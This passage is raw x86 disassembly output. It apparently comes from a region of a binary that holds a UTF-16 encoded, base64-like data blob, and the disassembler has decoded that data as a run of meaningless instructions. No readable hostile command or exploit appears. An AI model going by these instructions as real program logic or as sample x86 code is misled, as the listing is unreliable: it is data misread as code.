  40ae70:	00 47 00             	add    %al,0x0(%edi)
  40ae73:	73 00                	jae    0x40ae75
  40ae75:	36 00 68 00          	add    %ch,%ss:0x0(%eax)
  40ae79:	35 00 46 00 67       	xor    $0x67004600,%eax
  40ae7e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae81:	48                   	dec    %eax
  40ae82:	00 76 00             	add    %dh,0x0(%esi)
  40ae85:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae86:	00 36                	add    %dh,(%esi)
  40ae88:	00 55 00             	add    %dl,0x0(%ebp)
  40ae8b:	71 00                	jno    0x40ae8d
  40ae8d:	44                   	inc    %esp
  40ae8e:	00 56 00             	add    %dl,0x0(%esi)
  40ae91:	49                   	dec    %ecx
  40ae92:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae95:	6c                   	insb   (%dx),%es:(%edi)
  40ae96:	00 54 00 50          	add    %dl,0x50(%eax,%eax,1)
  40ae9a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae9d:	55                   	push   %ebp
  40ae9e:	00 78 00             	add    %bh,0x0(%eax)
  40aea1:	61                   	popa
  40aea2:	00 63 00             	add    %ah,0x0(%ebx)
  40aea5:	36 00 73 00          	add    %dh,%ss:0x0(%ebx)
  40aea9:	4a                   	dec    %edx
  40aeaa:	00 71 00             	add    %dh,0x0(%ecx)
  40aead:	35 00 79 00 48       	xor    $0x48007900,%eax
  40aeb2:	00 70 00             	add    %dh,0x0(%eax)
  40aeb5:	6e                   	outsb  %ds:(%esi),(%dx)
  40aeb6:	00 57 00             	add    %dl,0x0(%edi)
  40aeb9:	4f                   	dec    %edi
  40aeba:	00 78 00             	add    %bh,0x0(%eax)
  40aebd:	45                   	inc    %ebp
  40aebe:	00 32                	add    %dh,(%edx)
  40aec0:	00 42 00             	add    %al,0x0(%edx)
  40aec3:	45                   	inc    %ebp
  40aec4:	00 79 00             	add    %bh,0x0(%ecx)
  40aec7:	33 00                	xor    (%eax),%eax
  40aec9:	77 00                	ja     0x40aecb
  40aecb:	51                   	push   %ecx
  40aecc:	00 51 00             	add    %dl,0x0(%ecx)
  40aecf:	6a 00                	push   $0x0
  40aed1:	58                   	pop    %eax
  40aed2:	00 6d 00             	add    %ch,0x0(%ebp)
  40aed5:	2f                   	das
  40aed6:	00 71 00             	add    %dh,0x0(%ecx)
  40aed9:	51                   	push   %ecx
  40aeda:	00 57 00             	add    %dl,0x0(%edi)
  40aedd:	73 00                	jae    0x40aedf
  40aedf:	39 00                	cmp    %eax,(%eax)
  40aee1:	33 00                	xor    (%eax),%eax
  40aee3:	68 00 46 00 6d       	push   $0x6d004600
  40aee8:	00 53 00             	add    %dl,0x0(%ebx)
  40aeeb:	58                   	pop    %eax
  40aeec:	00 58 00             	add    %bl,0x0(%eax)
  40aeef:	77 00                	ja     0x40aef1
  40aef1:	57                   	push   %edi
  40aef2:	00 4e 00             	add    %cl,0x0(%esi)
  40aef5:	77 00                	ja     0x40aef7
  40aef7:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  40aefa:	00 72 00             	add    %dh,0x0(%edx)
  40aefd:	70 00                	jo     0x40aeff
  40aeff:	74 00                	je     0x40af01
  40af01:	63 00                	arpl   %eax,(%eax)
  40af03:	49                   	dec    %ecx
  40af04:	00 6a 00             	add    %ch,0x0(%edx)
  40af07:	59                   	pop    %ecx
  40af08:	00 78 00             	add    %bh,0x0(%eax)
  40af0b:	67 00 6c 00          	add    %ch,0x0(%si)
  40af0f:	6e                   	outsb  %ds:(%esi),(%dx)
  40af10:	00 5a 00             	add    %bl,0x0(%edx)
  40af13:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40af17:	44                   	inc    %esp
  40af18:	00 33                	add    %dh,(%ebx)
  40af1a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af1d:	50                   	push   %eax
  40af1e:	00 73 00             	add    %dh,0x0(%ebx)
  40af21:	79 00                	jns    0x40af23
  40af23:	41                   	inc    %ecx
  40af24:	00 65 00             	add    %ah,0x0(%ebp)
  40af27:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40af2b:	55                   	push   %ebp
  40af2c:	00 5a 00             	add    %bl,0x0(%edx)
  40af2f:	78 00                	js     0x40af31
  40af31:	70 00                	jo     0x40af33
  40af33:	74 00                	je     0x40af35
  40af35:	47                   	inc    %edi
  40af36:	00 48 00             	add    %cl,0x0(%eax)
  40af39:	76 00                	jbe    0x40af3b
  40af3b:	4e                   	dec    %esi
  40af3c:	00 68 00             	add    %ch,0x0(%eax)
  40af3f:	5a                   	pop    %edx
  40af40:	00 4a 00             	add    %cl,0x0(%edx)
  40af43:	71 00                	jno    0x40af45
  40af45:	70 00                	jo     0x40af47
  40af47:	35 00 6d 00 4b       	xor    $0x4b006d00,%eax
  40af4c:	00 32                	add    %dh,(%edx)
  40af4e:	00 6e 00             	add    %ch,0x0(%esi)
  40af51:	6e                   	outsb  %ds:(%esi),(%dx)
  40af52:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40af56:	00 69 00             	add    %ch,0x0(%ecx)
  40af59:	34 00                	xor    $0x0,%al
  40af5b:	71 00                	jno    0x40af5d
  40af5d:	68 00 62 00 6e       	push   $0x6e006200
  40af62:	00 6b 00             	add    %ch,0x0(%ebx)
  40af65:	68 00 34 00 65       	push   $0x65003400
  40af6a:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  40af6e:	00 41 00             	add    %al,0x0(%ecx)
  40af71:	43                   	inc    %ebx
  40af72:	00 53 00             	add    %dl,0x0(%ebx)
  40af75:	5a                   	pop    %edx
  40af76:	00 70 00             	add    %dh,0x0(%eax)
  40af79:	4f                   	dec    %edi
  40af7a:	00 2b                	add    %ch,(%ebx)
  40af7c:	00 51 00             	add    %dl,0x0(%ecx)
  40af7f:	48                   	dec    %eax
  40af80:	00 2b                	add    %ch,(%ebx)
  40af82:	00 35 00 67 00 78    	add    %dh,0x78006700
  40af88:	00 4d 00             	add    %cl,0x0(%ebp)
  40af8b:	64 00 39             	add    %bh,%fs:(%ecx)
  40af8e:	00 45 00             	add    %al,0x0(%ebp)
  40af91:	2b 00                	sub    (%eax),%eax
  40af93:	54                   	push   %esp
  40af94:	00 59 00             	add    %bl,0x0(%ecx)
  40af97:	59                   	pop    %ecx
  40af98:	00 38                	add    %bh,(%eax)
  40af9a:	00 68 00             	add    %ch,0x0(%eax)
  40af9d:	30 00                	xor    %al,(%eax)
  40af9f:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  40afa3:	51                   	push   %ecx
  40afa4:	00 57 00             	add    %dl,0x0(%edi)
  40afa7:	78 00                	js     0x40afa9
  40afa9:	75 00                	jne    0x40afab
  40afab:	38 00                	cmp    %al,(%eax)
  40afad:	30 00                	xor    %al,(%eax)
  40afaf:	2f                   	das
  40afb0:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
  40afb4:	00 4e 00             	add    %cl,0x0(%esi)
  40afb7:	6f                   	outsl  %ds:(%esi),(%dx)
  40afb8:	00 46 00             	add    %al,0x0(%esi)
  40afbb:	4f                   	dec    %edi
  40afbc:	00 52 00             	add    %dl,0x0(%edx)
  40afbf:	68 00 67 00 55       	push   $0x55006700
  40afc4:	00 52 00             	add    %dl,0x0(%edx)
  40afc7:	37                   	aaa
  40afc8:	00 76 00             	add    %dh,0x0(%esi)
  40afcb:	46                   	inc    %esi
  40afcc:	00 47 00             	add    %al,0x0(%edi)
  40afcf:	75 00                	jne    0x40afd1
  40afd1:	58                   	pop    %eax
  40afd2:	00 73 00             	add    %dh,0x0(%ebx)
  40afd5:	47                   	inc    %edi
  40afd6:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  40afda:	00 70 00             	add    %dh,0x0(%eax)
  40afdd:	36 00 59 00          	add    %bl,%ss:0x0(%ecx)
  40afe1:	44                   	inc    %esp
  40afe2:	00 62 00             	add    %ah,0x0(%edx)
  40afe5:	75 00                	jne    0x40afe7
  40afe7:	55                   	push   %ebp
  40afe8:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
  40afec:	00 56 00             	add    %dl,0x0(%esi)
  40afef:	62 00                	bound  %eax,(%eax)
  40aff1:	4b                   	dec    %ebx
  40aff2:	00 45 00             	add    %al,0x0(%ebp)
  40aff5:	43                   	inc    %ebx
  40aff6:	00 70 00             	add    %dh,0x0(%eax)
  40aff9:	5a                   	pop    %edx
  40affa:	00 65 00             	add    %ah,0x0(%ebp)
  40affd:	6f                   	outsl  %ds:(%esi),(%dx)
  40affe:	00 4d 00             	add    %cl,0x0(%ebp)
  40b001:	30 00                	xor    %al,(%eax)
  40b003:	68 00 62 00 55       	push   $0x55006200
  40b008:	00 55 00             	add    %dl,0x0(%ebp)
  40b00b:	79 00                	jns    0x40b00d
  40b00d:	6c                   	insb   (%dx),%es:(%edi)
  40b00e:	00 67 00             	add    %ah,0x0(%edi)
  40b011:	50                   	push   %eax
  40b012:	00 58 00             	add    %bl,0x0(%eax)
  40b015:	36 00 6a 00          	add    %ch,%ss:0x0(%edx)
  40b019:	6f                   	outsl  %ds:(%esi),(%dx)
  40b01a:	00 6f 00             	add    %ch,0x0(%edi)
  40b01d:	73 00                	jae    0x40b01f
  40b01f:	78 00                	js     0x40b021
  40b021:	61                   	popa
  40b022:	00 71 00             	add    %dh,0x0(%ecx)
  40b025:	35 00 46 00 73       	xor    $0x73004600,%eax
  40b02a:	00 57 00             	add    %dl,0x0(%edi)
  40b02d:	44                   	inc    %esp
  40b02e:	00 50 00             	add    %dl,0x0(%eax)
  40b031:	4f                   	dec    %edi
  40b032:	00 59 00             	add    %bl,0x0(%ecx)
  40b035:	6f                   	outsl  %ds:(%esi),(%dx)
  40b036:	00 78 00             	add    %bh,0x0(%eax)
  40b039:	78 00                	js     0x40b03b
  40b03b:	76 00                	jbe    0x40b03d
  40b03d:	54                   	push   %esp
  40b03e:	00 4b 00             	add    %cl,0x0(%ebx)
  40b041:	6e                   	outsb  %ds:(%esi),(%dx)
  40b042:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b045:	63 00                	arpl   %eax,(%eax)
  40b047:	52                   	push   %edx
  40b048:	00 71 00             	add    %dh,0x0(%ecx)
  40b04b:	6d                   	insl   (%dx),%es:(%edi)
  40b04c:	00 6d 00             	add    %ch,0x0(%ebp)
  40b04f:	48                   	dec    %eax
  40b050:	00 51 00             	add    %dl,0x0(%ecx)
  40b053:	37                   	aaa
  40b054:	00 4e 00             	add    %cl,0x0(%esi)
  40b057:	37                   	aaa
  40b058:	00 73 00             	add    %dh,0x0(%ebx)
  40b05b:	2b 00                	sub    (%eax),%eax
  40b05d:	7a 00                	jp     0x40b05f
  40b05f:	31 00                	xor    %eax,(%eax)
  40b061:	74 00                	je     0x40b063
  40b063:	64 00 32             	add    %dh,%fs:(%edx)
  40b066:	00 76 00             	add    %dh,0x0(%esi)
  40b069:	35 00 74 00 55       	xor    $0x55007400,%eax
  40b06e:	00 6a 00             	add    %ch,0x0(%edx)
  40b071:	43                   	inc    %ebx
  40b072:	00 30                	add    %dh,(%eax)
  40b074:	00 65 00             	add    %ah,0x0(%ebp)
  40b077:	51                   	push   %ecx
  40b078:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b07b:	72 00                	jb     0x40b07d
  40b07d:	39 00                	cmp    %eax,(%eax)
  40b07f:	76 00                	jbe    0x40b081
  40b081:	6e                   	outsb  %ds:(%esi),(%dx)
  40b082:	00 7a 00             	add    %bh,0x0(%edx)
  40b085:	46                   	inc    %esi
  40b086:	00 41 00             	add    %al,0x0(%ecx)
  40b089:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40b08c:	00 57 00             	add    %dl,0x0(%edi)
  40b08f:	44                   	inc    %esp
  40b090:	00 42 00             	add    %al,0x0(%edx)
  40b093:	6d                   	insl   (%dx),%es:(%edi)
  40b094:	00 4f 00             	add    %cl,0x0(%edi)
  40b097:	73 00                	jae    0x40b099
  40b099:	41                   	inc    %ecx
  40b09a:	00 73 00             	add    %dh,0x0(%ebx)
  40b09d:	47                   	inc    %edi
  40b09e:	00 50 00             	add    %dl,0x0(%eax)
  40b0a1:	42                   	inc    %edx
  40b0a2:	00 62 00             	add    %ah,0x0(%edx)
  40b0a5:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  40b0a9:	39 00                	cmp    %eax,(%eax)
  40b0ab:	6a 00                	push   $0x0
  40b0ad:	62 00                	bound  %eax,(%eax)
  40b0af:	30 00                	xor    %al,(%eax)
  40b0b1:	54                   	push   %esp
  40b0b2:	00 33                	add    %dh,(%ebx)
  40b0b4:	00 2f                	add    %ch,(%edi)
  40b0b6:	00 35 00 4f 00 30    	add    %dh,0x30004f00
  40b0bc:	00 5a 00             	add    %bl,0x0(%edx)
  40b0bf:	78 00                	js     0x40b0c1
  40b0c1:	63 00                	arpl   %eax,(%eax)
  40b0c3:	54                   	push   %esp
  40b0c4:	00 65 00             	add    %ah,0x0(%ebp)
  40b0c7:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40b0cb:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  40b0ce:	00 42 00             	add    %al,0x0(%edx)
  40b0d1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0d2:	00 32                	add    %dh,(%edx)
  40b0d4:	00 50 00             	add    %dl,0x0(%eax)
  40b0d7:	69 00 44 00 56 00    	imul   $0x560044,(%eax),%eax
  40b0dd:	6d                   	insl   (%dx),%es:(%edi)
  40b0de:	00 55 00             	add    %dl,0x0(%ebp)
  40b0e1:	74 00                	je     0x40b0e3
  40b0e3:	34 00                	xor    $0x0,%al
  40b0e5:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0e6:	00 53 00             	add    %dl,0x0(%ebx)
  40b0e9:	41                   	inc    %ecx
  40b0ea:	00 73 00             	add    %dh,0x0(%ebx)
  40b0ed:	57                   	push   %edi
  40b0ee:	00 68 00             	add    %ch,0x0(%eax)
  40b0f1:	6a 00                	push   $0x0
  40b0f3:	75 00                	jne    0x40b0f5
  40b0f5:	33 00                	xor    (%eax),%eax
  40b0f7:	74 00                	je     0x40b0f9
  40b0f9:	56                   	push   %esi
  40b0fa:	00 66 00             	add    %ah,0x0(%esi)
  40b0fd:	39 00                	cmp    %eax,(%eax)
  40b0ff:	33 00                	xor    (%eax),%eax
  40b101:	64 00 31             	add    %dh,%fs:(%ecx)
  40b104:	00 70 00             	add    %dh,0x0(%eax)
  40b107:	68 00 33 00 4c       	push   $0x4c003300
  40b10c:	00 6c 00 71          	add    %ch,0x71(%eax,%eax,1)
  40b110:	00 4a 00             	add    %cl,0x0(%edx)
  40b113:	36 00 54 00 61       	add    %dl,%ss:0x61(%eax,%eax,1)
  40b118:	00 4b 00             	add    %cl,0x0(%ebx)
  40b11b:	36 00 35 00 56 00 51 	add    %dh,%ss:0x51005600
  40b122:	00 61 00             	add    %ah,0x0(%ecx)
  40b125:	75 00                	jne    0x40b127
  40b127:	31 00                	xor    %eax,(%eax)
  40b129:	2b 00                	sub    (%eax),%eax
  40b12b:	43                   	inc    %ebx
  40b12c:	00 77 00             	add    %dh,0x0(%edi)
  40b12f:	68 00 62 00 78       	push   $0x78006200
  40b134:	00 77 00             	add    %dh,0x0(%edi)
  40b137:	41                   	inc    %ecx
  40b138:	00 67 00             	add    %ah,0x0(%edi)
  40b13b:	6b 00 30             	imul   $0x30,(%eax),%eax
  40b13e:	00 4a 00             	add    %cl,0x0(%edx)
  40b141:	4a                   	dec    %edx
  40b142:	00 78 00             	add    %bh,0x0(%eax)
  40b145:	73 00                	jae    0x40b147
  40b147:	6f                   	outsl  %ds:(%esi),(%dx)
  40b148:	00 68 00             	add    %ch,0x0(%eax)
  40b14b:	39 00                	cmp    %eax,(%eax)
  40b14d:	6b 00 63             	imul   $0x63,(%eax),%eax
  40b150:	00 33                	add    %dh,(%ebx)
  40b152:	00 41 00             	add    %al,0x0(%ecx)
  40b155:	45                   	inc    %ebp
  40b156:	00 56 00             	add    %dl,0x0(%esi)
  40b159:	57                   	push   %edi
  40b15a:	00 4c 00 68          	add    %cl,0x68(%eax,%eax,1)
  40b15e:	00 5a 00             	add    %bl,0x0(%edx)
  40b161:	78 00                	js     0x40b163
  40b163:	5a                   	pop    %edx
  40b164:	00 58 00             	add    %bl,0x0(%eax)
  40b167:	79 00                	jns    0x40b169
  40b169:	70 00                	jo     0x40b16b
  40b16b:	4f                   	dec    %edi
  40b16c:	00 4c 00 74          	add    %cl,0x74(%eax,%eax,1)
  40b170:	00 55 00             	add    %dl,0x0(%ebp)
  40b173:	51                   	push   %ecx
  40b174:	00 66 00             	add    %ah,0x0(%esi)
  40b177:	67 00 4e 00          	add    %cl,0x0(%bp)
  40b17b:	51                   	push   %ecx
  40b17c:	00 2b                	add    %ch,(%ebx)
  40b17e:	00 46 00             	add    %al,0x0(%esi)
  40b181:	4c                   	dec    %esp
  40b182:	00 69 00             	add    %ch,0x0(%ecx)
  40b185:	6a 00                	push   $0x0
  40b187:	68 00 6a 00 43       	push   $0x43006a00
  40b18c:	00 4c 00 32          	add    %cl,0x32(%eax,%eax,1)
  40b190:	00 30                	add    %dh,(%eax)
  40b192:	00 31                	add    %dh,(%ecx)
  40b194:	00 69 00             	add    %ch,0x0(%ecx)
  40b197:	4f                   	dec    %edi
  40b198:	00 55 00             	add    %dl,0x0(%ebp)
  40b19b:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40b19f:	49                   	dec    %ecx
  40b1a0:	00 33                	add    %dh,(%ebx)
  40b1a2:	00 43 00             	add    %al,0x0(%ebx)
  40b1a5:	74 00                	je     0x40b1a7
  40b1a7:	2f                   	das
  40b1a8:	00 62 00             	add    %ah,0x0(%edx)
  40b1ab:	78 00                	js     0x40b1ad
  40b1ad:	47                   	inc    %edi
  40b1ae:	00 41 00             	add    %al,0x0(%ecx)
  40b1b1:	55                   	push   %ebp
  40b1b2:	00 4a 00             	add    %cl,0x0(%edx)
  40b1b5:	72 00                	jb     0x40b1b7
  40b1b7:	2b 00                	sub    (%eax),%eax
  40b1b9:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1ba:	00 47 00             	add    %al,0x0(%edi)
  40b1bd:	68 00 57 00 4c       	push   $0x4c005700
  40b1c2:	00 59 00             	add    %bl,0x0(%ecx)
  40b1c5:	32 00                	xor    (%eax),%al
  40b1c7:	34 00                	xor    $0x0,%al
  40b1c9:	58                   	pop    %eax
  40b1ca:	00 65 00             	add    %ah,0x0(%ebp)
  40b1cd:	39 00                	cmp    %eax,(%eax)
  40b1cf:	35 00 34 00 75       	xor    $0x75003400,%eax
  40b1d4:	00 45 00             	add    %al,0x0(%ebp)
  40b1d7:	50                   	push   %eax
  40b1d8:	00 51 00             	add    %dl,0x0(%ecx)
  40b1db:	6c                   	insb   (%dx),%es:(%edi)
  40b1dc:	00 30                	add    %dh,(%eax)
  40b1de:	00 4b 00             	add    %cl,0x0(%ebx)
  40b1e1:	46                   	inc    %esi
  40b1e2:	00 6c 00 66          	add    %ch,0x66(%eax,%eax,1)
  40b1e6:	00 73 00             	add    %dh,0x0(%ebx)
  40b1e9:	57                   	push   %edi
  40b1ea:	00 78 00             	add    %bh,0x0(%eax)
  40b1ed:	45                   	inc    %ebp
  40b1ee:	00 79 00             	add    %bh,0x0(%ecx)
  40b1f1:	72 00                	jb     0x40b1f3
  40b1f3:	37                   	aaa
  40b1f4:	00 38                	add    %bh,(%eax)
  40b1f6:	00 48 00             	add    %cl,0x0(%eax)
  40b1f9:	6d                   	insl   (%dx),%es:(%edi)
  40b1fa:	00 61 00             	add    %ah,0x0(%ecx)
  40b1fd:	63 00                	arpl   %eax,(%eax)
  40b1ff:	4b                   	dec    %ebx
  40b200:	00 32                	add    %dh,(%edx)
  40b202:	00 75 00             	add    %dh,0x0(%ebp)
  40b205:	53                   	push   %ebx
  40b206:	00 58 00             	add    %bl,0x0(%eax)
  40b209:	43                   	inc    %ebx
  40b20a:	00 77 00             	add    %dh,0x0(%edi)
  40b20d:	72 00                	jb     0x40b20f
  40b20f:	48                   	dec    %eax
  40b210:	00 73 00             	add    %dh,0x0(%ebx)
  40b213:	4a                   	dec    %edx
  40b214:	00 57 00             	add    %dl,0x0(%edi)
  40b217:	45                   	inc    %ebp
  40b218:	00 69 00             	add    %ch,0x0(%ecx)
  40b21b:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  40b21f:	46                   	inc    %esi
  40b220:	00 32                	add    %dh,(%edx)
  40b222:	00 7a 00             	add    %bh,0x0(%edx)
  40b225:	79 00                	jns    0x40b227
  40b227:	43                   	inc    %ebx
  40b228:	00 6e 00             	add    %ch,0x0(%esi)
  40b22b:	39 00                	cmp    %eax,(%eax)
  40b22d:	4b                   	dec    %ebx
  40b22e:	00 4f 00             	add    %cl,0x0(%edi)
  40b231:	69 00 4c 00 47 00    	imul   $0x47004c,(%eax),%eax
  40b237:	6f                   	outsl  %ds:(%esi),(%dx)
  40b238:	00 77 00             	add    %dh,0x0(%edi)
  40b23b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b23c:	00 51 00             	add    %dl,0x0(%ecx)
  40b23f:	57                   	push   %edi
  40b240:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40b244:	00 42 00             	add    %al,0x0(%edx)
  40b247:	6f                   	outsl  %ds:(%esi),(%dx)
  40b248:	00 45 00             	add    %al,0x0(%ebp)
  40b24b:	67 00 56 00          	add    %dl,0x0(%bp)
  40b24f:	49                   	dec    %ecx
  40b250:	00 72 00             	add    %dh,0x0(%edx)
  40b253:	2b 00                	sub    (%eax),%eax
  40b255:	48                   	dec    %eax
  40b256:	00 79 00             	add    %bh,0x0(%ecx)
  40b259:	6b 00 43             	imul   $0x43,(%eax),%eax
  40b25c:	00 59 00             	add    %bl,0x0(%ecx)
  40b25f:	4d                   	dec    %ebp
  40b260:	00 71 00             	add    %dh,0x0(%ecx)
  40b263:	61                   	popa
  40b264:	00 37                	add    %dh,(%edi)
  40b266:	00 67 00             	add    %ah,0x0(%edi)
  40b269:	7a 00                	jp     0x40b26b
  40b26b:	35 00 58 00 4c       	xor    $0x4c005800,%eax
  40b270:	00 41 00             	add    %al,0x0(%ecx)
  40b273:	39 00                	cmp    %eax,(%eax)
  40b275:	63 00                	arpl   %eax,(%eax)
  40b277:	57                   	push   %edi
  40b278:	00 41 00             	add    %al,0x0(%ecx)
  40b27b:	6a 00                	push   $0x0
  40b27d:	72 00                	jb     0x40b27f
  40b27f:	56                   	push   %esi
  40b280:	00 32                	add    %dh,(%edx)
  40b282:	00 2f                	add    %ch,(%edi)
  40b284:	00 56 00             	add    %dl,0x0(%esi)
  40b287:	52                   	push   %edx
  40b288:	00 6b 00             	add    %ch,0x0(%ebx)
  40b28b:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  40b28f:	41                   	inc    %ecx
  40b290:	00 75 00             	add    %dh,0x0(%ebp)
  40b293:	4a                   	dec    %edx
  40b294:	00 63 00             	add    %ah,0x0(%ebx)
  40b297:	33 00                	xor    (%eax),%eax
  40b299:	4e                   	dec    %esi
  40b29a:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  40b29e:	00 31                	add    %dh,(%ecx)
  40b2a0:	00 4a 00             	add    %cl,0x0(%edx)
  40b2a3:	66 00 54 00 39       	data16 add %dl,0x39(%eax,%eax,1)
  40b2a8:	00 4d 00             	add    %cl,0x0(%ebp)
  40b2ab:	48                   	dec    %eax
  40b2ac:	00 37                	add    %dh,(%edi)
  40b2ae:	00 6e 00             	add    %ch,0x0(%esi)
  40b2b1:	4e                   	dec    %esi
  40b2b2:	00 2b                	add    %ch,(%ebx)
  40b2b4:	00 39                	add    %bh,(%ecx)
  40b2b6:	00 58 00             	add    %bl,0x0(%eax)
  40b2b9:	74 00                	je     0x40b2bb
  40b2bb:	2b 00                	sub    (%eax),%eax
  40b2bd:	43                   	inc    %ebx
  40b2be:	00 68 00             	add    %ch,0x0(%eax)
  40b2c1:	66 00 49 00          	data16 add %cl,0x0(%ecx)
  40b2c5:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  40b2c9:	36 00 47 00          	add    %al,%ss:0x0(%edi)
  40b2cd:	43                   	inc    %ebx
  40b2ce:	00 31                	add    %dh,(%ecx)
  40b2d0:	00 68 00             	add    %ch,0x0(%eax)
  40b2d3:	4c                   	dec    %esp
  40b2d4:	00 36                	add    %dh,(%esi)
  40b2d6:	00 51 00             	add    %dl,0x0(%ecx)
  40b2d9:	39 00                	cmp    %eax,(%eax)
  40b2db:	44                   	inc    %esp
  40b2dc:	00 62 00             	add    %ah,0x0(%edx)
  40b2df:	4e                   	dec    %esi
  40b2e0:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b2e3:	6d                   	insl   (%dx),%es:(%edi)
  40b2e4:	00 67 00             	add    %ah,0x0(%edi)
  40b2e7:	49                   	dec    %ecx
  40b2e8:	00 55 00             	add    %dl,0x0(%ebp)
  40b2eb:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2ec:	00 2f                	add    %ch,(%edi)
  40b2ee:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
  40b2f2:	00 79 00             	add    %bh,0x0(%ecx)
  40b2f5:	58                   	pop    %eax
  40b2f6:	00 38                	add    %bh,(%eax)
  40b2f8:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b2fb:	46                   	inc    %esi
  40b2fc:	00 74 00 34          	add    %dh,0x34(%eax,%eax,1)
  40b300:	00 65 00             	add    %ah,0x0(%ebp)
  40b303:	72 00                	jb     0x40b305
  40b305:	5a                   	pop    %edx
  40b306:	00 38                	add    %bh,(%eax)
  40b308:	00 6f 00             	add    %ch,0x0(%edi)
  40b30b:	71 00                	jno    0x40b30d
  40b30d:	56                   	push   %esi
  40b30e:	00 4b 00             	add    %cl,0x0(%ebx)
  40b311:	68 00 77 00 66       	push   $0x66007700
  40b316:	00 72 00             	add    %dh,0x0(%edx)
  40b319:	5a                   	pop    %edx
  40b31a:	00 55 00             	add    %dl,0x0(%ebp)
  40b31d:	74 00                	je     0x40b31f
  40b31f:	33 00                	xor    (%eax),%eax
  40b321:	32 00                	xor    (%eax),%al
  40b323:	42                   	inc    %edx
  40b324:	00 4b 00             	add    %cl,0x0(%ebx)
  40b327:	6c                   	insb   (%dx),%es:(%edi)
  40b328:	00 68 00             	add    %ch,0x0(%eax)
  40b32b:	48                   	dec    %eax
  40b32c:	00 38                	add    %bh,(%eax)
  40b32e:	00 6e 00             	add    %ch,0x0(%esi)
  40b331:	61                   	popa
  40b332:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40b336:	00 69 00             	add    %ch,0x0(%ecx)
  40b339:	39 00                	cmp    %eax,(%eax)
  40b33b:	6a 00                	push   $0x0
  40b33d:	7a 00                	jp     0x40b33f
  40b33f:	4c                   	dec    %esp
  40b340:	00 42 00             	add    %al,0x0(%edx)
  40b343:	71 00                	jno    0x40b345
  40b345:	6f                   	outsl  %ds:(%esi),(%dx)
  40b346:	00 51 00             	add    %dl,0x0(%ecx)
  40b349:	46                   	inc    %esi
  40b34a:	00 42 00             	add    %al,0x0(%edx)
  40b34d:	57                   	push   %edi
  40b34e:	00 48 00             	add    %cl,0x0(%eax)
  40b351:	6e                   	outsb  %ds:(%esi),(%dx)
  40b352:	00 59 00             	add    %bl,0x0(%ecx)
  40b355:	4f                   	dec    %edi
  40b356:	00 4d 00             	add    %cl,0x0(%ebp)
  40b359:	72 00                	jb     0x40b35b
  40b35b:	61                   	popa
  40b35c:	00 53 00             	add    %dl,0x0(%ebx)
  40b35f:	4c                   	dec    %esp
  40b360:	00 31                	add    %dh,(%ecx)
  40b362:	00 79 00             	add    %bh,0x0(%ecx)
  40b365:	38 00                	cmp    %al,(%eax)
  40b367:	73 00                	jae    0x40b369
  40b369:	59                   	pop    %ecx
  40b36a:	00 43 00             	add    %al,0x0(%ebx)
  40b36d:	33 00                	xor    (%eax),%eax
  40b36f:	58                   	pop    %eax
  40b370:	00 4e 00             	add    %cl,0x0(%esi)
  40b373:	4c                   	dec    %esp
  40b374:	00 57 00             	add    %dl,0x0(%edi)
  40b377:	44                   	inc    %esp
  40b378:	00 39                	add    %bh,(%ecx)
  40b37a:	00 7a 00             	add    %bh,0x0(%edx)
  40b37d:	6c                   	insb   (%dx),%es:(%edi)
  40b37e:	00 48 00             	add    %cl,0x0(%eax)
  40b381:	53                   	push   %ebx
  40b382:	00 4b 00             	add    %cl,0x0(%ebx)
  40b385:	30 00                	xor    %al,(%eax)
  40b387:	4e                   	dec    %esi
  40b388:	00 49 00             	add    %cl,0x0(%ecx)
  40b38b:	6d                   	insl   (%dx),%es:(%edi)
  40b38c:	00 6e 00             	add    %ch,0x0(%esi)
  40b38f:	61                   	popa
  40b390:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b393:	52                   	push   %edx
  40b394:	00 6c 00 34          	add    %ch,0x34(%eax,%eax,1)
  40b398:	00 39                	add    %bh,(%ecx)
  40b39a:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
  40b39e:	00 77 00             	add    %dh,0x0(%edi)
  40b3a1:	67 00 56 00          	add    %dl,0x0(%bp)
  40b3a5:	37                   	aaa
  40b3a6:	00 4d 00             	add    %cl,0x0(%ebp)
  40b3a9:	75 00                	jne    0x40b3ab
  40b3ab:	58                   	pop    %eax
  40b3ac:	00 6b 00             	add    %ch,0x0(%ebx)
  40b3af:	58                   	pop    %eax
  40b3b0:	00 65 00             	add    %ah,0x0(%ebp)
  40b3b3:	51                   	push   %ecx
  40b3b4:	00 76 00             	add    %dh,0x0(%esi)
  40b3b7:	43                   	inc    %ebx
  40b3b8:	00 61 00             	add    %ah,0x0(%ecx)
